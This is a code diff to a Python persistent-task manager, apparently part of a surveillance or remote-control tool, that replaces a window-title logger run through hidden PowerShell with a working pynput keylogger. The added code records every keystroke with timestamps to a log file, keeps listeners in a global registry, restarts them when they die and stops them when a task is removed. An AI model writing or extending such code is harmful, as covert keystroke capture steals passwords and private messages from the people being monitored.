@@ -132,9 +132,21 @@ class PersistentTaskManager:
     def remove_task(self, task_id: str) -> Optional[PersistentTask]:
         """Remove a task from registry."""
         task = self.tasks.pop(task_id, None)
+        
+        # Stop async loop
         if task_id in self.running_loops:
             self.running_loops[task_id].cancel()
             del self.running_loops[task_id]
+            
+        # Stop keylogger listener
+        if task_id in ACTIVE_LISTENERS:
+            try:
+                print(f"[KEYLOG] Stopping listener for {task_id}")
+                listener = ACTIVE_LISTENERS.pop(task_id)
+                listener.stop()
+            except Exception as e:
+                print(f"[ERROR] Failed to stop listener: {e}")
+                
         self._save_tasks()
         return task
     
@@ -194,58 +206,52 @@ $bitmap.Dispose()
         return None
 
 
+# Global registry for active listeners
+ACTIVE_LISTENERS = {}
+
 async def action_keylog(task: PersistentTask, iteration: int) -> Optional[str]:
-    """Log keystrokes (requires pynput or similar)."""
-    # Note: Keylogging requires additional libraries and elevated privileges
-    # This is a placeholder that logs active window titles instead
+    """Log keystrokes using pynput."""
     if platform.system() != "Windows":
         return None
-    
+        
     try:
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"activity_{task.task_id[:8]}_{timestamp}.txt"
-        filepath = KEYLOGS_DIR / filename
-        
-        # Get active window title
-        ps_script = '''
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-using System.Text;
-public class Win32 {
-    [DllImport("user32.dll")]
-    public static extern IntPtr GetForegroundWindow();
-    [DllImport("user32.dll", SetLastError=true)]
-    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
-}
-"@
-$hwnd = [Win32]::GetForegroundWindow()
-$sb = New-Object System.Text.StringBuilder(256)
-[Win32]::GetWindowText($hwnd, $sb, 256) | Out-Null
-$sb.ToString()
-'''
-        result = subprocess.run(
-            ["powershell", "-NoProfile", "-Command", ps_script],
-            capture_output=True,
-            text=True,
-            timeout=10,
-            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
-        )
-        
-        window_title = result.stdout.strip()
-        timestamp_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
-        # Append to log file
-        log_path = KEYLOGS_DIR / f"activity_log_{task.task_id[:8]}.txt"
-        with open(log_path, 'a', encoding='utf-8') as f:
-            f.write(f"[{timestamp_str}] {window_title}\n")
-        
-        print(f"[ACTIVITY] Logged: {window_title[:50]}...")
-        return str(log_path)
-        
-    except Exception as e:
-        print(f"[ACTIVITY] Error: {e}")
+        from pynput import keyboard
+    except ImportError:
+        print("[ERROR] pynput not installed. Run: pip install pynput")
         return None
+
+    log_path = KEYLOGS_DIR / f"activity_log_{task.task_id[:8]}.txt"
+    
+    # Start listener if not already running for this task
+    if task.task_id not in ACTIVE_LISTENERS:
+        print(f"[KEYLOG] Starting listener for task {task.task_id}")
+        
+        def on_press(key):
+            try:
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                with open(log_path, 'a', encoding='utf-8') as f:
+                    if hasattr(key, 'char'):
+                        f.write(f"[{timestamp}] {key.char}\n")
+                    else:
+                        # Handle special keys
+                        key_str = str(key).replace('Key.', '').upper()
+                        f.write(f"[{timestamp}] [{key_str}]\n")
+            except Exception as e:
+                print(f"[KEYLOG ERROR] {e}")
+
+        # Non-blocking listener
+        listener = keyboard.Listener(on_press=on_press)
+        listener.start()
+        ACTIVE_LISTENERS[task.task_id] = listener
+        
+    # Check if listener is alive
+    listener = ACTIVE_LISTENERS.get(task.task_id)
+    if listener and not listener.is_alive():
+        print(f"[KEYLOG] Listener died, restarting...")
+        del ACTIVE_LISTENERS[task.task_id]
+        # Will restart on next iteration
+    
+    return str(log_path)
 
 
 async def action_process_check(task: PersistentTask, iteration: int) -> Optional[str]:
